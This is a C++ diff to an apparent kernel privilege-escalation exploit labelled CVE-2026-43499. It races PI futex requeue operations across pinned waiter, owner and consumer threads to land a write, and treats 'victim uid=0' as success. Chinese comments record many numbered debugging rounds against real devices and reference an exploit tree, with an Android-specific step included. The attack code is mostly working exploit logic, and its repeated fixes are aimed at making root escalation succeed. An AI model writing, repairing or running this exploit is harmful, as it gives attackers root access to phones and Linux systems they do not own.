@@ -27,9 +27,12 @@
  *  order above can be driven and its log asserted on the host.
  */
 #include <atomic>
+
+#include "support/log.hpp"   /* ★ 第 271 轮 ✓（用户裁定）：异步日志接缝 ✓ —— 出 PI 由它打印 ✓ */
 #include <concepts>
 #include <cstddef>
 #include <cstdint>
+#include <string_view>
 #include <cstdio>
 #include <cerrno>
 #include <cstring>
@@ -162,6 +165,20 @@ namespace ghostlock::backend::cve_2026_43499::seam {
         std::int32_t waiter_result = 0;
         std::int32_t owner_result = 0;
         std::int32_t requeue_result = 0;
+        /* PI 内的 syscall 读数（2026-10-12 用户裁定：PI 内只落字段，出 PI 才打印）。
+         * errno 必须**紧接其 syscall 之后**取，否则会被下一条调用覆盖。 */
+        std::int32_t lock_result = 0;
+        std::int32_t lock_errno = 0;
+        std::int32_t park_errno = 0;
+        std::int32_t disarm_result = 0;
+        std::int32_t disarm_errno = 0;
+        /* park-about 是**park 那一刻**的快照，所以这里存一份：这两个 futex 字是**活的**（owner
+         *  取锁后 target_word 会被内核/演员改写，解锁后又回 0）⇒ 出 PI 再读读到的是**别的时候**的值，
+         *  不是被诊断的那一刻。撤环前的 POD 环天然满足（记录写在 park 点之后）；撤环改成出 PI 统一
+         *  打印后，首轮实现漏了快照 ⇒ 真机该列整列变 0（基线为 0x1768… 递增）✗ ⇒ 快照字段是这条
+         *  读数**语义的前提**，不是多余状态（Lead 2026-10-12 追认为第 6、7 个字段）。 */
+        std::uint32_t park_wait_word = 0U;
+        std::uint32_t park_target_word = 0U;
         std::int32_t stamp_result = -1;
         std::int32_t stamp_errno = 0;
         std::int32_t attempts_used = 0;
@@ -185,6 +202,13 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             waiter_result = 0;
             owner_result = 0;
             requeue_result = 0;
+            lock_result = 0;
+            lock_errno = 0;
+            park_errno = 0;
+            disarm_result = 0;
+            disarm_errno = 0;
+            park_wait_word = 0U;
+            park_target_word = 0U;
             stamp_result = -1;
             stamp_errno = 0;
             attempts_used = 0;
@@ -203,27 +227,31 @@ namespace ghostlock::backend::cve_2026_43499::seam {
      *  @note   One attempt per call: the caller's retry policy is the window's, and a second attempt
      *          re-parks a fresh waiter, because a requeue consumes the waiter it moved.
      */
+    // TODO(routeexec-compile-time): 机械改动 —— 本类此前继承 `seam::RouteExec`（虚基类）并 override
+    //   其 `execute`/`arm`；按用户裁定与 docs/analysis/43499-plan-routeexec-compile-time.md，
+    //   路由不再继承任何东西：窗口以本类型作模板实参直接调用（编译期）。
+    //   完成 = 三线门禁绿 ＋ 真机判据不变 ＋ Lead/用户确认 ⇒ 删本标注。
     template <RouteOps Ops>
-    class MulticastRoute final : public RouteExec {
+    class MulticastRoute final {
       public:
         explicit MulticastRoute(const MulticastRouteConfig &config) noexcept : config_(config) {}
 
         MulticastRoute(const MulticastRoute &) = delete;
         MulticastRoute &operator=(const MulticastRoute &) = delete;
-        ~MulticastRoute() noexcept override { stop_threads(); }
+        ~MulticastRoute() noexcept { stop_threads(); }
 
         /** The window's warm-up beat. The route's own loop is what arms the consumer per round --
          *  the retired route does it inside the trigger -- so this is the window's account of a round
          *  that copied the stamp without arming, and it reports whether that round is one the limits
          *  allow. */
-        [[nodiscard]] bool arm(std::int32_t attempt) noexcept override {
+        [[nodiscard]] bool arm(std::int32_t attempt) noexcept {
             return attempt >= 0 && attempt < config_.limits.arm_sequence;
         }
 
         /** One attempt. The stamp is built here, the three actors run, the requeue happens, and the
          *  waiters are joined before this returns. */
         [[nodiscard]] bool execute(std::uint64_t address, std::uint64_t value,
-                                   std::uint64_t offset) noexcept override {
+                                   std::uint64_t offset) noexcept {
             static_cast<void>(offset);
             report_ = MulticastRouteReport{};
             if (config_.limits.max_attempts <= 0 || config_.limits.arm_hold <= 0 ||
@@ -264,6 +292,10 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                 Ops::yield();
             }
             stop_threads();
+            /* ★ 出 PI 的唯一 flush 点（2026-10-12 用户裁定：禁令作用域＝PI 内；PI 完成后才打印）：
+             *  所有 actor 已 join ⇒ 链不再被走 ⇒ 这里打印的读数由 PI 内的字段带出（零 IO 进 PI）
+             *  ⇒ 行名与取值与撤掉的 POD 环**逐字一致** ⇒ 判据仍看真机日志含这些行 ✓。 */
+            report_pi_readings("info");
             return judge();
         }
 
@@ -344,7 +376,8 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             owner_started_ = true;
             /* 移植缺的一行：requeue() 等的是 shared_.owner_started，而它此前从未被置 1
              * （只有 reset 与 read）⇒ requeue 死等、一次都不调用 ⇒ 写不可能发生。 */
-            shared_.owner_started.store(1);
+            /* 旧码（原文保留 ✓，第 261 轮移入 owner 线程且置于 `lock_pi(target_word)` 之后 ✗）：
+             *     shared_.owner_started.store(1);    // ⇒ 门控在 owner 尚未持有 target 时即放行 ✗（ref 相反 ✓） */
             const int rc_waiter = ::pthread_create(&waiter_, nullptr, &MulticastRoute::waiter_entry, this);
             if (rc_waiter != 0) {
                 return false;
@@ -360,11 +393,27 @@ namespace ghostlock::backend::cve_2026_43499::seam {
         static void on_signal(int) noexcept {}
 
         void requeue() noexcept {
+            ghostlock::support::log("debug", "requeue ->");   /* ★ 步骤前 ✓ 语句边界 ✓ */
             std::signal(SIGUSR1, &MulticastRoute::on_signal);   /* 幂等 ✓；必须先于任何 tgkill ✓ */
+            /* ★★ 第 258 轮 ✓（按 ref 指示：`ghostlock-app-ref/.../race/threads.cpp:176` 逐字 ——
+             *  门控循环里是 **`usleep(race_state_poll_interval_us())`** ✓ 而本树用 `Ops::yield()` ✗ ⇒
+             *  **⇒ 忙等 ⇒ 标志一置位就**立刻**发 requeue ⇒ 而 park 线程可能尚未被调度** ✗ ⇒
+             *  ⇒ 真机读数**并存**即证：`requeue ret=0`（⇒ 无人可唤醒 ✓）但 `park errno=110`（⇒ 一直等不到 ✓）✓。
+             *  值走 wire（`execution.*state_poll_interval_us` ✓）✗ 不写死 ✓；为零时退回 `yield` ✓。 */
             while (shared_.waiter_waiting.load() == 0 || shared_.owner_started.load() == 0) {
-                Ops::yield();
+                /* ★★ 第 259 轮 ✓（ref `race/threads.cpp:176` 逐字：门控循环里**短睡**，而非忙等 ✗）：
+                 *  本树原是 `Ops::yield()` ✗ ⇒ **标志一置位就**立刻**发 requeue ⇒ park 线程可能尚未上 CPU** ⇒
+                 *  真机读数**并存即证**：`requeue ret=0`（⇒ 无人可唤醒 ✓）但 `park errno=110`（⇒ 等不到 ✓）✓✓
+                 *  值复用**已有的 wire 字段** `settle_us` ✓（⇒ ref 用 `race_state_poll_interval_us` ✓ 同角色 ✓），
+                 *  为零时退回 `yield` ✓（⇒ 不引入新的常量 ✗ 不写死 ✗）。 */
+                if (config_.settle_us > 0) {
+                    Ops::sleep_micros(config_.settle_us);
+                } else {
+                    Ops::yield();
+                }
             }
             if (config_.settle_us > 0) {
+                ghostlock::support::log("debug", "requeue branch: settle grace before requeue");
                 Ops::sleep_micros(config_.settle_us);
             }
             /* 与退役同字：requeue 从**等待者持有的那个字**（chain_word ✓）搬走（退役 cmp_requeue_pi(chain, target)）。 */
@@ -381,10 +430,37 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             /* ★ 第 179 轮 ✓（与旧码 `UNLOCK(l1)` 同效 ✓）：`val3` 对应的那个字也要"归零"✓ ⇒
              *  否则我们读到的值（owner 的 TID ✗）与内核所见不一致 ⇒ **EAGAIN** ✗。 */
             shared_.target_word = 0U;
+            /* ★★ 第 267 轮 ✓（既有探针 `tools/requeue_probe.cpp` 的**内核级判据** ✓，其头注释逐字：
+             *  「The wait for the parked state is **not a sleep**：a priority-inheritance futex **records its
+             *    owner in the word and sets a bit when a waiter is queued** ⇒ the owner **waits for that bit**；
+             *    **if it never appears the probe fails rather than requeueing nothing and calling it success**」✓）
+             *  ⇒ ⇒ **等"等待者已入队"的位（`0x80000000` ✓）再 requeue** ✗ —— 本树原靠 `waiter_waiting` ＋ 宽限 ✗
+             *  ⇒ 两者都**不代表内核已入队** ⇒ **⇒ 这是"`requeue ret=0` 却唤醒 0 个"的机制级成因** ✓✓。 */
+            constexpr std::uint32_t kWaitersBit = 0x80000000U;
+            for (std::int32_t spin = 0; spin < config_.limits.arm_hold; ++spin) {
+                if ((shared_.wait_word & kWaitersBit) != 0U) { break; }
+                Ops::yield();
+            }
+            std::printf("main: waiters-bit word=0x%x queued=%d",
+                        static_cast<unsigned>(shared_.wait_word),
+                        (shared_.wait_word & kWaitersBit) != 0U ? 1 : 0);
             errno = 0;
-            shared_.requeue_result = Ops::cmp_requeue_pi(&shared_.chain_word, &shared_.target_word);
+            /* ★★ 第 250 轮 ✓：`uaddr` 随 park 同改 `wait_word` ✓（旧码（原文保留 ✓）：`cmp_requeue_pi(&shared_.chain_word, …)` ✗）
+             *  ⇒ 三者一致：**锁的字 ＝ park 的字 ＝ requeue 的 uaddr** ✓ ＝ 旧码 `l2` 的角色 ✓。 */
+            /* ★★ 第 252 轮 ✓：`uaddr = chain_word`（等待者**停驻**的字 ✓，owner 亦持它 ✓）、
+             *  `uaddr2 = wait_word`（等待者**持有**的字 ✓ —— `:514` lock_pi ✓）⇒ 两者不同 ✓。 */
+            /* ★★ 第 254 轮 ✓（ref 分工）：`uaddr` = **停驻字**（`wait_word` ✓）、`uaddr2` = **持有字**（`chain_word` ✓）
+             *  —— 第 252 轮写反 ✗ ⇒ 真机 `EAGAIN(11)` ✓（自洽 ✓）。 */
+            /* ★★ 第 265 轮 ✓（决定性 ✓）：`uaddr2` **必须与等待者 park 时的 `uaddr2` 相同** ✗ ——
+             *  park（`:575` ✓）传的是 `&shared_.**target_word**` ✓，而此处曾传 `&shared_.chain_word` ✗
+             *  ⇒ ⇒ 内核按**另一把锁**去找对应的 PI waiter ⇒ **找不到** ⇒ *仍返回 0* 但**唤醒 0 个** ✗
+             *  ⇒ ⇒ ⇒ 三读数**完全吻合**：`requeue ret=0` ✓ ＋ `park ret=66/errno=110`（⇒ 一直等不到 ✓）
+             *     ＋ `park about-to value=0x0`（⇒ 条件满足 ⇒ 确实挂起 ✓）。 */
+            shared_.requeue_result = Ops::cmp_requeue_pi(&shared_.wait_word, &shared_.target_word);
             /* ★★ 第 197 轮**回退** ✗：第 190 轮在此发 `SIGUSR1` ⇒ 真机在"建线程/设 CPU"后**停住** ✗
              *  （⇒ 纯 C 的 `tgkill` 是**同进程内**的 `mr_y_tid` ✓；本树条件不同 ⇒ 先撤 ✓）。 */
+            ghostlock::support::log("debug", "requeue <- ret",
+                                                static_cast<std::int64_t>(shared_.requeue_result));
             std::printf("main: requeue ret=%d errno=%d (EDEADLK=35 ✅ 旧码的成功形态 ✓)",
                         static_cast<int>(shared_.requeue_result), static_cast<int>(errno));
             /* 相位一（退役 waiter.post_requeue_settle_us）：内核搬完链再让 consumer 动。 */
@@ -411,6 +487,31 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             }
         }
 
+        /** The PI readings, one line each, written out only after every actor has stopped.
+         *  撤掉 POD 环后由本函数承担它的展开：行名与取值与撤环前**逐字一致** ⇒ 真机判据不变。
+         *  @param level The level name for every line (the logger's level comes from the profile).
+         *  @note Must run outside PI: the caller reaches it after stop_threads() has joined all
+         *        actors, so nothing is being walked while these lines are written. */
+        void report_pi_readings(std::string_view level) noexcept {
+            ghostlock::support::log(level, "waiter-lock", shared_.lock_result, shared_.lock_errno);
+            ghostlock::support::log(level, "park-about word",
+                                    static_cast<std::int64_t>(shared_.park_wait_word));
+            ghostlock::support::log(level, "park-about target-word address",
+                                    ghostlock::support::Hex{
+                                            static_cast<std::uint64_t>(shared_.park_target_word)});
+            ghostlock::support::log(level, "park-return", shared_.waiter_result, shared_.park_errno);
+#if defined(__ANDROID__)
+            /* 摘除只在设备侧跑（与写入点同一条件 ✓）⇒ 非设备构建不印这条幻影行 ✓。 */
+            if (config_.needs_ghost_disarm) {
+                ghostlock::support::log(level, "ghost-disarm", shared_.disarm_result,
+                                        shared_.disarm_errno);
+            }
+#endif
+        }
+
+        /* PI-EXEMPT-JUDGE：本函数在 PI 之外，故不在禁令作用域内 —— 它唯一的调用点在 stop_threads()
+         *  之后（所有 actor 已 join ⇒ 链不再被走），因此这里可以直接打印；守卫台账里 judge 是**具名
+         *  豁免**，本条注释即它的出处（见 tools/window_body_guard.py 的 PI-EXEMPT-JUDGE ✓）。 */
         /** The verdict, with the rule the retired route applies: the socket option's answer is not
          *  the answer -- only a consumer call the kernel accepted counts as a landed write, so a
          *  status of Ok without one is downgraded to a retry. */
@@ -434,6 +535,12 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                 status.code = route::RouteResultCode::Retryable;
                 status.step = 62;
             }
+            /* ★ C 段 ✓（两个**结果分支**各出一条 ✓）：judge 的**唯一调用点在 stop_threads() 之后**
+             *  ⇒ 本函数整个在 PI 之外（2026-10-12 用户裁定）⇒ 直接打印，不进环、也不受守卫扫描 ✓
+             *  （守卫台账里 judge 是**具名豁免** ✓，见 tools/window_body_guard.py）。 */
+            ghostlock::support::log("info", "judge-outcome",
+                                    static_cast<std::int64_t>(status.code),
+                                    static_cast<std::int64_t>(status.step));
             report_.status = status;
             return status.code == route::RouteResultCode::Ok;
         }
@@ -442,6 +549,8 @@ namespace ghostlock::backend::cve_2026_43499::seam {
          *  one copy is one the kernel accepted, arm the consumer on the rounds that count, and only
          *  accept a round the consumer confirms. */
         void trigger() noexcept {
+            /* PI-IN-TRIGGER：trigger **全体在 PI 内**（唯一调用点是 waiter_main 的 PI 段之内、park 之后
+             *  —— 拷贝必须落在"park 刚返回"的那个线程栈上）⇒ 本函数没有 PI 之外的尾部。 */
             const int fd = Ops::open_datagram();
             if (fd < 0) {
                 shared_.status_code = static_cast<std::int32_t>(route::RouteResultCode::FallbackSafe);
@@ -464,6 +573,7 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                  * the shape check is not a landed shape either, so both cases try again. */
                 if (attempt < config_.limits.arm_sequence ||
                     !shape_landed(result, stamp_errno)) {
+                    /* ★ 分支日志（2026-10-12 裁定：**分支也要** ✓）：warm-up 轮 / 形状未落 ⇒ 只发不 arm ✓。 */
                     continue;
                 }
                 shared_.consumer_go.store(attempt);
@@ -490,6 +600,8 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             shared_.status_code = static_cast<std::int32_t>(
                 landed ? route::RouteResultCode::Ok : route::RouteResultCode::FallbackSafe);
             shared_.status_step = landed ? 0 : 61;
+            /* PI-OUT-TRIGGER：trigger 自己的跨度到此为止。**注意：PI 没有结束** —— 本函数返回后
+             *  仍回到 waiter_main 的 PI 段内（那边的 PI-OUT 在摘除之后）。 */
         }
 
         /** Whether the copy is one the kernel accepted: either it returned success, or it refused for
@@ -509,9 +621,12 @@ namespace ghostlock::backend::cve_2026_43499::seam {
              *  原先与 park/requeue 共用 `chain_word` ✗ ⇒ **"在自己锁着的字上 park"** ⇒
              *  `lock_pi` 返回 -1（真机 `waiter=-1` ✓）⇒ requeue 无 waiter ⇒ **EAGAIN(11)** ✗✓ */
             errno = 0;
-            shared_.waiter_result = Ops::lock_pi(&shared_.wait_word);
-            std::printf("main: waiter lock ret=%d errno=%d (0=成功 ✓；22=EINVAL ⇒ `_PRIVATE` 用错 ✗)",
-                        static_cast<int>(shared_.waiter_result), static_cast<int>(errno));
+            /* ★★ 第 254 轮 ✓（按 ref 指示：`ghostlock-app-ref/src/core/race/threads.cpp:24` 逐字 ——
+             *  等待者持有的是 **`chain_futex`** ✓；本树原持 `wait_word` ✗ ⇒ 与 `:555` 的 `unlock_pi(chain_word)`
+             *  不配对（⇒ 孤儿 unlock，自证错位 ✓）。 */
+            shared_.waiter_result = Ops::lock_pi(&shared_.chain_word);
+            shared_.lock_result = shared_.waiter_result;
+            shared_.lock_errno = errno;   /* 紧接 syscall 后取（PI 内只落字段，出 PI 打印） */
             /* ★★ 第 203 轮**删**✓（旧码分工 ✓）：waiter **不该锁 `target_word`** ✗ —— 那是 owner 的角色
              *  （旧码 `mr_y` 只锁 `mr_l2` ✓，`mr_x` 才锁 `mr_l1` ✓）⇒ 两者争锁 ⇒ **互等 ⇒ 卡死** ✗（真机 ✓）。 */
             shared_.waiter_ready.store(1);
@@ -521,13 +636,43 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             /* ★ 第 122 轮 ✓：`waiter_waiting` **移到 park 返回之后**（原先在 park 之前 ✗）——
              *  `requeue()`（`:342` ✓）等的就是它 ⇒ 原先它一置位 requeue 即可发起 ✗ ⇒
              *  **⇒ 内核可能在 waiter 尚未 park 时搬链 ⇒ 拷贝无处落 ⇒ 写不发生** ✗ ⇒ 现与 park 串行 ✓。 */
+            /* ★★ 第 240 轮 ✓（根因确证 ✓）：`waiter_waiting` 的置位**提前到 park 之前** ——
+             *  此前（第 122 轮）它在 park **返回之后** ✗ ⇒ `requeue()` 的门控（`:364` ✓）等的正是它
+             *  ⇒ ⇒ **⇒ requeue 必然在"park 已结束"之后发出 ⇒ 那一刻 `uaddr` 上已无 PI 等待者
+             *  ⇒ 内核返回 `EAGAIN(11)`** ✗（真机 **15/15** ✓ 逐字 `requeue ret=-1 errno=11` ✓）。
+             *  而它之所以曾被推到 park 之后，是怕"内核在 waiter 尚未 park 时搬链 ⇒ 拷贝无处落" ✗
+             *  ⇒ ⇒ **⇒ 该顾虑由 requeue 侧**已有的 `settle_us` 宽限**承担（`:367` ✓，值走 wire ✗ 不写死 ✓）**
+             *  ⇒ 两全：门控提前释放 ＋ 宽限保证"已进入 park" ✓。
+             *  完成 = 真机 `requeue ret=-1 errno=35`（EDEADLK ✓ 旧码成功形态）＋ `main: victim uid=0`
+             *         ＋ 用户确认 ⇒ 删本注释块（AGENTS §3 有界性 ✓）。 */
+            /* PI-IN：park 前最后一次同步（旧「窗口体」定义里的起点锚，语义未变）—— 从这里到本函数
+             *  末尾的 PI-OUT，pi_window.hpp:12-21 的禁令成立（守卫的起点锚 ✓）。 */
+            shared_.waiter_waiting.store(1);   /* 旧位置在 park 之后（原文保留 ✓）：见下方注释块 */
             const std::int64_t park_us = static_cast<std::int64_t>(config_.park_ms) * 1000;
+            /* park-about 的两个数在**这里**取快照（两个 futex 字是活的，出 PI 再读就不是这一刻的值）。 */
+            shared_.park_wait_word = shared_.wait_word;
+            shared_.park_target_word = shared_.target_word;
             const std::int32_t parked =
                 /* ★ 与退役对齐：park 在**自己持有的那个字**（chain_word ✓）上 —— 退役是
                  *  wait_requeue_pi(chain, target)（先 lock_pi(chain) 再在 chain 上 park ✓）。
                  *  此前 park 在 wait_word ✗ ⇒ 与"持有的字"不是同一个 ⇒ 链上的位置不对。 */
-                Ops::wait_requeue_pi_until(&shared_.chain_word, &shared_.target_word, park_us);
-            shared_.waiter_waiting.store(1);   /* ★ 第 122 轮 ✓：park **已完成** ⇒ 此时才放行 requeue ✓ */
+                /* ★★ 第 250 轮 ✓（根因：**锁的字**与 **park 的字**必须同一个 ✓ —— 旧码 `lock_pi(l2)` 再在 `l2` 上 park ✓）：
+                 *  旧码（原文保留 ✓）：`Ops::wait_requeue_pi_until(&shared_.**chain_word**, …)` ✗ —— 而 waiter 持有的是
+                 *  `wait_word` ✗（`:505` ✓）⇒ 内核在 `chain_word` 上**看不到**该等待者 ⇒ requeue 得 **EAGAIN(11)** ✗。 */
+                /* ★★ 第 252 轮 ✓（内核契约：**停在 `uaddr`（= chain_word ✗）**、**持有 `uaddr2`（= wait_word ✓）**
+                 *  两者必须**不同** ✗ —— 第 250 轮让它们同为 `wait_word` ⇒ **EINVAL(22)** ✗（真机 32/32 ✓）。 */
+                /* 第 252/254 轮**回退** ✗：`uaddr2` 改 `wait_word` ⇒ 真机 `EAGAIN(11)` ×30 ✗
+                 *  （⇒ 四种组合全量后：`(chain,target)` 11 ✗ ／ `(wait,target)` 22 ✗ ／ `(chain,wait)` 11 ✗）
+                 *  ⇒ **⇒ 疑点不在"哪个字"，而在"等待者是否真的停在 `uaddr` 上"** ⇒ 恢复冻结参照 ✓。 */
+                /* ★★ 第 254 轮 ✓（ref `:48` 逐字：**停在** `wait_futex` ✓、目标 `target_futex` ✓）⇒ 本树改为
+                 *  停在 `wait_word` ✓（⇒ 与"持有 `chain_word`"分工一致 ✓）。 */
+                Ops::wait_requeue_pi_until(&shared_.wait_word, &shared_.target_word, park_us);
+            /* 旧码（原文保留 ✓，第 122 轮的置位 → 已上移至 park 之前 ✗）：
+             *     shared_.waiter_waiting.store(1);    // park 已完成 ⇒ 此时才放行 requeue（⇒ EAGAIN ✗） */
+            /* ★ 诊断（第 255 轮 ✓）：park 的**返回值与 errno** —— 本树此前**只有** `waiter lock` 一条读数 ✗，
+             *  而四次真机的矩阵（`uaddr` 取 `wait_word` ⇒ EINVAL ✗／取 `chain_word` ⇒ EAGAIN ✗）指向
+             *  "**等待者从未停驻**" ✓ ⇒ 此处是唯一没有观测量的环节 ✓（⇒ 验证后连同本块一并清理 ✓）。 */
+            shared_.park_errno = errno;   /* 紧接 park 返回后取 ✓（下一句可能改动 errno ✗） */
             shared_.waiter_result = parked;
             /* ★ requeue 由**本线程**做（第 148 轮 ✓）：脆弱版 `remove_waiter()` **读 `current`** ✓
              *  （"The copy landing on the caller's stack is a race against skb page recycling" ✓）
@@ -554,16 +699,27 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                 errno = 0;
                 const int disarm = Ops::futex(const_cast<std::uint32_t *>(&dummy_pi),
                                               FUTEX_LOCK_PI, 0U, &expired, nullptr);
-                std::printf("main: mcast ghost disarm ret=%d errno=%d", disarm, errno);
+                shared_.disarm_result = disarm;
+                shared_.disarm_errno = errno;   /* 紧接摘除调用后取 ✓ */
             }
 #endif
+            /* PI-OUT：摘除完成 ⇒ 本线程的 PI 段到此为止（守卫的终点锚 ✓）；本函数此后不再 IO ✓。 */
             return nullptr;
         }
 
         void *owner_main() noexcept {
             pin_self(config_.main_cpu);
+            /* PI-IN：owner 从这里进入 PI（取目标锁 ⇒ 成为链主）；到末次 unlock 之后的 PI-OUT 为止。 */
             /* The target lock first: the waiter's park is a request to be moved onto it. */
             shared_.owner_result = Ops::lock_pi(&shared_.target_word);
+            /* ★★ 第 261 轮 ✓（按 ref 指示：`ghostlock-app-ref/.../race/threads.cpp:82-87` 逐字 ——
+             *  owner **先** `LOCK_PI(target_futex)` ✓ **再** `owner_started.store(1)` ✓✓）——
+             *  本树的置位此前在 **main 线程**里、紧跟 `pthread_create` ✗ ⇒ **⇒ 门控在 owner 尚未持有
+             *  `target_word` 时就被放行** ✗ ⇒ ⇒ 其后果与真机两处读数**逐字吻合**：
+             *    `requeue ret=0`（⇒ 内核**看不到**可 requeue 的 PI 等待者 ⇒ 唤醒 0 个 ✓）
+             *    `park errno=110`（⇒ 该等待者**始终没被唤醒** ✓）。
+             *  ⇒ 本行即 ref 的 `:87` ✓；`main` 侧那一处已按 §3 套注释 ✓。 */
+            shared_.owner_started.store(1);
             while (shared_.waiter_ready.load() == 0 && shared_.owner_stop.load() == 0) {
                 Ops::yield();
             }
@@ -580,11 +736,15 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                 Ops::sleep_micros(100);
             }
             (void) Ops::unlock_pi(&shared_.target_word);
+            /* PI-OUT：owner 交还目标锁 ⇒ 本线程的 PI 段到此为止（守卫的终点锚 ✓）。 */
             return nullptr;
         }
 
         void *consumer_main() noexcept {
             pin_self(config_.consumer_cpu);
+            /* PI-IN-CONSUMER：consumer 从这里进入 PI —— 本函数只做一件事：在 waiter 停泊期间让内核
+             *  走一次 PI 链（`Ops::setattr`，被拒时退回自持的目标锁）。轮次在循环里重复，所以这段 PI
+             *  用**整个循环**表示；线程自身的 pin 在 PI 之前，不在扫描段内（2026-10-12 裁定同此）。 */
             std::int32_t seen = 0;
             while (shared_.consumer_stop.load() == 0) {
                 const std::int32_t sequence = shared_.consumer_go.load();
@@ -634,6 +794,7 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                     }
                 }
             }
+            /* PI-OUT-CONSUMER：循环退出 ⇒ 本线程的 PI 动作到此为止（不再触发链、不再触碰目标锁）✓ */
             return nullptr;
         }
 
